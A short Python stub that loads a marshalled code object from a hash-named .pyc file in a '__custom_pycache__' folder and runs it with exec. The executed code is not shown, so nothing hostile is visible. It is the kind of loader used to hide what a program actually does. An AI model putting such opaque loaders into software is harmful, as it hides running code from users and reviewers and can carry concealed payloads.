
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Para_c323631fb8b2486c9026124cd746fde2.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
